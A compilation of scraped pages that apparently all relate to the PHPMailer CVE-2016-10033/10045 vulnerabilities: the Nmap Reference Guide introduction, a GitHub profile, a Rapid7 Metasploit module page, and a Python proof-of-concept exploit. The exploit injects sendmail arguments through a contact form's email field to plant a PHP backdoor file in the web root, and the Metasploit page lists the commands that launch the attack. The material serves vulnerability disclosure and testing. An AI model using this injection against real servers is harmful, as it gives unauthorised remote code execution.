![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

* [Nmap Network Scanning](toc.html)
* Chapter 15. Nmap Reference Guide

[Prev](data-files-replacing-data-files.html)[Next](man-briefoptions.html)
# Chapter 15. Nmap Reference Guide

Table of Contents

* [Description](man.html#man-description)
* [Options Summary](man-briefoptions.html)
* [Target Specification](man-target-specification.html)
* [Host Discovery](man-host-discovery.html)
* [Port Scanning Basics](man-port-scanning-basics.html)
* [Port Scanning Techniques](man-port-scanning-techniques.html)
* [Port Specification and Scan Order](man-port-specification.html)
* [Service and Version Detection](man-version-detection.html)
* [OS Detection](man-os-detection.html)
* [Nmap Scripting Engine (NSE)](man-nse.html)
* [Timing and Performance](man-performance.html)
* [Firewall/IDS Evasion and Spoofing](man-bypass-firewalls-ids.html)
* [Output](man-output.html)
* [Miscellaneous Options](man-misc-options.html)
* [Runtime Interaction](man-runtime-interaction.html)
* [Examples](man-examples.html)
* [Nmap Book](man-book.html)
* [Bugs](man-bugs.html)
* [Authors](man-author.html)
* [Legal Notices](man-legal.html)
  + [Nmap Copyright and Licensing](man-legal.html#nmap-copyright)
  + [Creative Commons License for this Nmap Guide](man-legal.html#man-copyright)
  + [Source Code Availability and Community Contributions](man-legal.html#source-contrib)
  + [No Warranty](man-legal.html#no-warranty)
  + [Inappropriate Usage](man-legal.html#inappropriate-usage)
  + [Third-Party Software and Funding Notices](man-legal.html#third-party-soft)
  + [United States Export Control](man-legal.html#us-export)
## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org

Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.029s latency).
rDNS record for 74.207.244.221: li86-221.members.linode.com
Not shown: 995 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)
| ssh-hostkey: 1024 8d:60:f1:7c:ca:b7:3d:0a:d6:67:54:9d:69:d9:b9:dd (DSA)
|_2048 79:f8:09:ac:d4:e2:32:42:10:49:d3:bd:20:82:85:ec (RSA)
80/tcp   open     http        Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Go ahead and ScanMe!
646/tcp  filtered ldp
1720/tcp filtered H.323/Q.931
9929/tcp open     nping-echo  Nping echo
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.39
OS details: Linux 2.6.39
Network Distance: 11 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
[Cut first 10 hops for brevity]
11  17.65 ms li86-221.members.linode.com (74.207.244.221)

Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds

```

The newest version of Nmap can be obtained from
[`https://nmap.org`](https://nmap.org). The newest version of this man page
is available at [`https://nmap.org/book/man.html`](https://nmap.org/book/man.html).
It is also included as a chapter of [*Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning*](https://nmap.org/book/).

---

[Prev](data-files-replacing-data-files.html)Using Customized Data Files[Up](toc.html)Nmap Network Scanning[Home](toc.html)[Next](man-briefoptions.html)Options Summary

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from legalhackers.com_05fe6288_20250126_062511.html ===
#!/usr/bin/python
intro = """
PHPMailer RCE PoC Exploits
PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
+
PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
(the bypass of the first patch for CVE-2016-10033)
Discovered and Coded by:
Dawid Golunski
@dawid\_golunski
https://legalhackers.com
"""
usage = """
Usage:
Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html
PoC Video:
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
Disclaimer:
For testing purposes only. Do no harm.
"""
import time
import urllib
import urllib2
import socket
import sys
RW\_DIR = "/var/www/html/uploads"
url = 'http://VictimWebServer/contact\_form.php' # Set destination URL here
# Choose/uncomment one of the payloads:
# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
#payload = '"attacker\\" -oQ/tmp/ -X%s/phpcode.php some"@email.com' % RW\_DIR
# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
payload = "\"attacker\\' -oQ/tmp/ -X%s/phpcode.php some\"@email.com" % RW\_DIR
######################################
# PHP code to be saved into the backdoor php file on the target in RW\_DIR
RCE\_PHP\_CODE = "php phpinfo(); ?"
post\_fields = {'action': 'send', 'name': 'Jas Fasola', 'email': payload, 'msg': RCE\_PHP\_CODE}
# Attack
data = urllib.urlencode(post\_fields)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the\_page = response.read()


=== Content from github.com_07b85f91_20250126_062458.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZenexer)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZenexer)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@Zenexer](https://avatars.githubusercontent.com/u/504130?s=64&v=4)

**Zenexer**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2FZenexer)

[Overview](/Zenexer)
[Repositories
87](/Zenexer?tab=repositories)
[Projects
0](/Zenexer?tab=projects)
[Packages
1](/Zenexer?tab=packages)
[Stars
28](/Zenexer?tab=stars)

More

* [Overview](/Zenexer)
* [Repositories](/Zenexer?tab=repositories)
* [Projects](/Zenexer?tab=projects)
* [Packages](/Zenexer?tab=packages)
* [Stars](/Zenexer?tab=stars)

![@Zenexer](https://avatars.githubusercontent.com/u/504130?s=64&v=4)

**Zenexer**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2FZenexer)

[![View Zenexer's full-sized avatar](https://avatars.githubusercontent.com/u/504130?v=4)](https://avatars.githubusercontent.com/u/504130?v=4)

# Paul B Zenexer

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2FZenexer)

[41
followers](https://github.com/Zenexer?tab=followers) · [8
following](https://github.com/Zenexer?tab=following)

* 01:24
  (UTC -05:00)

## [Achievements](/Zenexer?tab=achievements)

[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)](/Zenexer?achievement=starstruck&tab=achievements)[![Achievement: Pair Extraordinaire](https://github.githubassets.com/assets/pair-extraordinaire-default-579438a20e01.png)](/Zenexer?achievement=pair-extraordinaire&tab=achievements)[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default-39c6aec8ff89.png)](/Zenexer?achievement=quickdraw&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/Zenexer?achievement=yolo&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/Zenexer?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x2](/Zenexer?achievement=pull-shark&tab=achievements)
## [Achievements](/Zenexer?tab=achievements)

[![Achievement: Starstruck](https://github.githubassets.com/assets/starstruck-default-b6610abad518.png)](/Zenexer?achievement=starstruck&tab=achievements)[![Achievement: Pair Extraordinaire](https://github.githubassets.com/assets/pair-extraordinaire-default-579438a20e01.png)](/Zenexer?achievement=pair-extraordinaire&tab=achievements)[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default-39c6aec8ff89.png)](/Zenexer?achievement=quickdraw&tab=achievements)[![Achievement: YOLO](https://github.githubassets.com/assets/yolo-default-be0bbff04951.png)](/Zenexer?achievement=yolo&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/Zenexer?achievement=arctic-code-vault-contributor&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x2](/Zenexer?achievement=pull-shark&tab=achievements)
## Organizations

[![@Earth2Me](https://avatars.githubusercontent.com/u/1332235?s=64&v=4)](/Earth2Me) [![@AP-CS](https://avatars.githubusercontent.com/u/1430388?s=64&v=4)](/AP-CS) [![@Craffy](https://avatars.githubusercontent.com/u/4791346?s=64&v=4)](/Craffy) [![@MineScript](https://avatars.githubusercontent.com/u/5009184?s=64&v=4)](/MineScript)

Block or Report

# Block or report Zenexer

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user’s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=Zenexer+%28user%29)

[Overview](/Zenexer)
[Repositories
87](/Zenexer?tab=repositories)
[Projects
0](/Zenexer?tab=projects)
[Packages
1](/Zenexer?tab=packages)
[Stars
28](/Zenexer?tab=stars)

More

* [Overview](/Zenexer)
* [Repositories](/Zenexer?tab=repositories)
* [Projects](/Zenexer?tab=projects)
* [Packages](/Zenexer?tab=packages)
* [Stars](/Zenexer?tab=stars)

## Popular repositories Loading

1. [internet-reference](/Zenexer/internet-reference) internet-reference
   Public

   [16](/Zenexer/internet-reference/stargazers)
   [6](/Zenexer/internet-reference/forks)
2. [lnkr](/Zenexer/lnkr) lnkr
   Public

   Information about lnkr5, malware distributed via Chrome extensions

   JavaScript

   [10](/Zenexer/lnkr/stargazers)
   [2](/Zenexer/lnkr/forks)
3. [safeshell](/Zenexer/safeshell) safeshell
   Public

   Prevent PHP vulnerabilities similar to CVE-2016-10033 and CVE-2016-10045.

   [8](/Zenexer/safeshell/stargazers)
   [1](/Zenexer/safeshell/forks)
4. [ForgePlugin](/Zenexer/ForgePlugin) ForgePlugin
   Public

   Bukkit plugin and mod patches for Tekkit Classic (MC 1.2.5).

   Java

   [6](/Zenexer/ForgePlugin/stargazers)
   [4](/Zenexer/ForgePlugin/forks)
5. [mc3p](/Zenexer/mc3p) mc3p
   Public

   Forked from [dalbothek/mc3p](/dalbothek/mc3p)

   The Minecraft Protocol Parsing Proxy (with Plugin support! and alliteration!)

   Python

   [2](/Zenexer/mc3p/stargazers)
6. [CrossPlatform](/Zenexer/CrossPlatform) CrossPlatform
   Public

   Cross-platform tools and configuration files.

   Vim Script

   [2](/Zenexer/CrossPlatform/stargazers)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.rapid7.com_e78f3acf_20250125_054103.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
  + [日本語](/ja/db/modules/)
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg) Sign In](https://insight.rapid7.com/saml/SSO)
[Contact us](/contact/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
  + [日本語](/ja/db/modules/)
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

[Contact us](/contact/)

* [Home](/)
* [Vulnerability & Exploit Database](/db/)
* **Modules**

#### Rapid7 Vulnerability & Exploit Database

# PHPMailer Sendmail Argument Injection

 [Back to Search](https://www.rapid7.com/db/)

### PHPMailer Sendmail Argument Injection

Disclosed
12/26/2016

Created
05/30/2018

#### Description

PHPMailer versions up to and including 5.2.19 are affected by a
vulnerability which can be leveraged by an attacker to write a file with
partially controlled contents to an arbitrary location through injection
of arguments that are passed to the sendmail binary. This module
writes a payload to the web root of the webserver before then executing
it with an HTTP request. The user running PHPMailer must have write
access to the specified WEB\_ROOT directory and successful exploitation
can take a few minutes.

#### Author(s)

* Dawid Golunski
* Spencer McIntyre

#### Platform

PHP

#### Architectures

php

#### Development

* [Source Code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/phpmailer_arg_injection.rb)
* [History](https://github.com/rapid7/metasploit-framework/commits/master//modules/exploits/multi/http/phpmailer_arg_injection.rb)

#### Module Options

To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':

```
msf > use exploit/multi/http/phpmailer_arg_injection
msf exploit(phpmailer_arg_injection) > show targets
    ...targets...
msf exploit(phpmailer_arg_injection) > set TARGET < target-id >
msf exploit(phpmailer_arg_injection) > show options
    ...show and set options...
msf exploit(phpmailer_arg_injection) > exploit
```

### Metasploit

Penetration testing software for offensive security teams.

Key Features

* [Collect and share all the information you need to conduct a successful and efficient penetration test](/products/metasploit/features)
* [Simulate complex attacks against your systems and users](/products/metasploit/features)
* [Test your defenses to make sure they’re ready](/products/metasploit/features)
* [Automate Every Step of Your Penetration Test](/products/metasploit/features)

[Free Metasploit Pro Trial](/try/metasploit-pro/)
[View All Features](/products/metasploit/features/)

Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.

– Jim O’Gorman | President, Offensive Security

;

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
